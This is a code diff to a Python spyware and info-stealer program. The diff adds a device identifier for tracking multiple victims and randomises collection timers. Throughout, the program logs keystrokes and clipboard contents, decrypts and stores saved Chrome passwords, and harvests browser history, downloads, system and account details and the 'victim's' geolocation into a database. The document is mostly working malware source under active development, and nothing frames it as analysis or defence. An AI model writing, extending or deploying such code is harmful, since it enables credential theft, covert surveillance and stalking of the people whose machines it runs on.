@@ -30,7 +30,12 @@ import shutil
 import sqlite3
 import requests
 from geopy.geocoders import Nominatim
+import uuid
+import random
 
+
+# Generate a unique device_id for this device
+device_id = str(uuid.uuid4())
 # Connect to MySQL database
 db = mysql.connector.connect(
     host="localhost",
@@ -45,6 +50,7 @@ cursor = db.cursor()
 create_keystrokes_table_query = """
 CREATE TABLE IF NOT EXISTS keystrokes (
     id INT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(36) NOT NULL,
     time DATETIME NOT NULL,
     key_data VARCHAR(255) NOT NULL
 )
@@ -54,6 +60,7 @@ CREATE TABLE IF NOT EXISTS keystrokes (
 create_clipboard_table_query = """
 CREATE TABLE IF NOT EXISTS clipboard (
     id INT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(36) NOT NULL,
     time DATETIME NOT NULL,
     data VARCHAR(255) NOT NULL
 )
@@ -63,6 +70,7 @@ CREATE TABLE IF NOT EXISTS clipboard (
 create_applications_table_query = """
 CREATE TABLE IF NOT EXISTS applications (
     id INT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(36) NOT NULL,
     time DATETIME NOT NULL,
     action VARCHAR(50) NOT NULL,
     app_name VARCHAR(255) NOT NULL
@@ -73,6 +81,7 @@ CREATE TABLE IF NOT EXISTS applications (
 create_system_info_table_query = """
 CREATE TABLE IF NOT EXISTS system_info (
     id INT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(36) NOT NULL,
     time DATETIME NOT NULL,
     system_specifications TEXT,
     user_accounts TEXT,
@@ -83,6 +92,7 @@ CREATE TABLE IF NOT EXISTS system_info (
 create_downloads_table_query = """
 CREATE TABLE IF NOT EXISTS downloads (
     id INT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(36) NOT NULL,
     time DATETIME NOT NULL,
     file_name VARCHAR(255) NOT NULL,
     file_path VARCHAR(255) NOT NULL
@@ -92,6 +102,7 @@ CREATE TABLE IF NOT EXISTS downloads (
 create_chrome_passwords_table_query = """
 CREATE TABLE IF NOT EXISTS chrome_passwords (
     id INT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(36) NOT NULL,
     origin_url VARCHAR(255) NOT NULL,
     action_url VARCHAR(255) NOT NULL,
     username VARCHAR(255) NOT NULL,
@@ -105,6 +116,7 @@ CREATE TABLE IF NOT EXISTS chrome_passwords (
 create_browser_history_table_query = """
 CREATE TABLE IF NOT EXISTS browser_history (
     id INT AUTO_INCREMENT PRIMARY KEY,
+    device_id VARCHAR(36) NOT NULL,
     url VARCHAR(255) NOT NULL,
     title VARCHAR(255) NOT NULL,
     last_visit_time DATETIME NOT NULL
@@ -114,6 +126,7 @@ CREATE TABLE IF NOT EXISTS browser_history (
 create_location_info_table_query = """
 CREATE TABLE IF NOT EXISTS location_info (
 id INT AUTO_INCREMENT PRIMARY KEY,
+device_id VARCHAR(36) NOT NULL,
 time DATETIME NOT NULL,
 latitude FLOAT,
 longitude FLOAT,
@@ -139,24 +152,24 @@ except mysql.connector.Error as err:
     print(f"Error during table creation: {err}")
     pass  # Handle any errors that might occur during table creation
 
+
 # Function to insert data into the appropriate table
 def insert_data(data_type, data):
     try:
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         if data_type == "Keystroke":
-            query = "INSERT INTO keystrokes (time, key_data) VALUES (%s, %s)"
+            query = "INSERT INTO keystrokes (device_id, time, key_data) VALUES (%s, %s, %s)"
         elif data_type == "Clipboard":
-            query = "INSERT INTO clipboard (time, data) VALUES (%s, %s)"
+            query = "INSERT INTO clipboard (device_id, time, data) VALUES (%s, %s, %s)"
         elif data_type == "Application":
-            query = "INSERT INTO applications (time, action, app_name) VALUES (%s, %s, %s)"
+            # Correct the typo here, change %S to %s
+            query = "INSERT INTO applications (device_id, time, action, app_name) VALUES (%s, %s, %s, %s)"
         elif data_type == "SystemInfo":
-            query = "INSERT INTO system_info (time, system_specifications, user_accounts, connected_devices) " \
-                    "VALUES (%s, %s, %s, %s)"
-
+            query = "INSERT INTO system_info (device_id, time, system_specifications, user_accounts, connected_devices) VALUES (%s, %s, %s, %s, %s)"
         else:
             return
 
-        values = (current_time, *data)
+        values = (device_id, current_time, *data)
         cursor.execute(query, values)
         db.commit()
         print(f"Data inserted successfully: {data_type} - {data}")
@@ -276,8 +289,8 @@ def insert_download_data(file_name, file_path):
     try:
 
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        query = "INSERT INTO downloads (time, file_name, file_path) VALUES (%s, %s, %s)"
-        values = (current_time, file_name, file_path)
+        query = "INSERT INTO downloads (device_id,time, file_name, file_path) VALUES (%s,%s, %s, %s)"
+        values = (device_id,current_time, file_name, file_path)
         cursor.execute(query, values)
         db.commit()
         print(f"Download data inserted successfully: {file_name}")
@@ -324,9 +337,9 @@ def decrypt_password(password, key):
 # Function to insert chrome passwords data into the chrome_passwords table
 def insert_chrome_password_data(origin_url, action_url, username, password, creation_date, last_used_date):
     try:
-        query = "INSERT INTO chrome_passwords (origin_url, action_url, username, password, creation_date, last_used_date) " \
-                "VALUES (%s, %s, %s, %s, %s, %s)"
-        values = (origin_url, action_url, username, password, creation_date, last_used_date)
+        query = "INSERT INTO chrome_passwords (device_id,origin_url, action_url, username, password, creation_date, last_used_date) " \
+                "VALUES (%s,%s, %s, %s, %s, %s, %s)"
+        values = (device_id,origin_url, action_url, username, password, creation_date, last_used_date)
         cursor.execute(query, values)
         db.commit()
         print(f"Chrome passwords data inserted successfully for: {username}")
@@ -360,7 +373,7 @@ def extract_and_insert_chrome_passwords():
             if username or password:
                 time.sleep(1)
                 insert_chrome_password_data(origin_url, action_url, username, password,
-                                            get_chrome_datetime(date_created), get_chrome_datetime(date_last_used))
+                                            get_chrome_datetime(date_created),get_chrome_datetime(date_last_used))
             else:
                 continue
         cursor.close()
@@ -436,9 +449,9 @@ def get_browser_history_file_location():
 def insert_browser_history_data(url, title, last_visit_time):
     try:
         time.sleep(1)
-        query = "INSERT INTO browser_history (url, title, last_visit_time) " \
-                "VALUES (%s, %s, %s)"
-        values = (url, title, last_visit_time)
+        query = "INSERT INTO browser_history (device_id,url, title, last_visit_time) " \
+                "VALUES (%s,%s, %s, %s)"
+        values = (device_id,url, title, last_visit_time)
         cursor.execute(query, values)
         db.commit()
         print(f"Browser history data inserted successfully: {url}")
@@ -460,7 +473,7 @@ def extract_and_insert_browser_history():
                 for entry in extracted_data:
 
                     url, title, last_visit_time = entry
-                    insert_browser_history_data(url, title, last_visit_time)
+                    insert_browser_history_data(url, title,last_visit_time)
 
     except Exception as e:
         print(f"Error extracting browser history: {e}")
@@ -486,9 +499,8 @@ def get_victim_location():
             google_maps_link = f"https://www.google.com/maps/place/{latitude},{longitude}/"
 
             # Insert the location data into the location_info table
-            query = "INSERT INTO location_info (time, latitude, longitude, city, country, address, google_maps_link) " \
-                    "VALUES (%s, %s, %s, %s, %s, %s, %s)"
-            values = (current_time, latitude, longitude, city, country, address, google_maps_link)
+            query = "INSERT INTO location_info (device_id,time, latitude, longitude, city, country, address, google_maps_link) VALUES (%s,%s, %s, %s, %s, %s, %s, %s)"
+            values = (device_id,current_time, latitude, longitude, city, country, address, google_maps_link)
             cursor.execute(query, values)
             db.commit()
             print("Victim's location data inserted successfully.")
@@ -507,50 +519,51 @@ def get_victim_location():
 
 
 
+def get_random_interval():
+ return random.uniform(1, 120)
 
 
-# Set the time interval for keylogger data insertion (in seconds)
-interval = 60.0
-
-
-
-#Feature : 1
+# Feature : 1
 # Schedule the keylogger to run at the specified interval
-keylogger_timer = Timer(interval, start_keylogger)
+keylogger_timer = Timer(30.00, start_keylogger)
 keylogger_timer.start()
-#Feature : 2
+# Feature : 2
 # Start clipboard monitoring
-clipboard_thread = Timer(interval, monitor_clipboard)
+clipboard_thread = Timer(get_random_interval(), monitor_clipboard)
 clipboard_thread.start()
-#Feature : 3
+# Feature : 3
 # Start application monitoring
-applications_thread = Timer(interval, monitor_applications)
+applications_thread = Timer(get_random_interval(), monitor_applications)
 applications_thread.start()
-#Feature : 4
+# Feature : 4
 # Schedule the download data insertion to run at the specified interval
-downloads_timer = Timer(interval, get_last_10_downloads)
+downloads_timer = Timer(get_random_interval(), get_last_10_downloads)
 downloads_timer.start()
 
-#Feature : 5
+# Feature : 5
 # Gather system information at the beginning
 gather_system_info()
 # Schedule the system info gathering to run at a longer interval
-system_info_timer = Timer(interval, gather_system_info)
+system_info_timer = Timer(get_random_interval(), gather_system_info)
 system_info_timer.start()
 
-#Feature : 6
+# Feature : 6
 # Schedule the chrome passwords extraction and insertion to run at the specified interval
-chrome_passwords_timer = Timer(interval, extract_and_insert_chrome_passwords)
+chrome_passwords_timer = Timer(get_random_interval(), extract_and_insert_chrome_passwords)
 chrome_passwords_timer.start()
 
-#Feature : 7
+# Feature : 7
 # Schedule the browser history extraction and insertion to run at the specified interval
-browser_history_timer = Timer(interval, extract_and_insert_browser_history)
+browser_history_timer = Timer(get_random_interval(), extract_and_insert_browser_history)
 browser_history_timer.start()
 
-
-#Feature : 8
+# Feature : 8
 # Schedule the victim's location retrieval at the specified interval
-location_timer = Timer(interval, get_victim_location)
+location_timer = Timer(get_random_interval(), get_victim_location)
 location_timer.start()
+
+
+
+
+
 
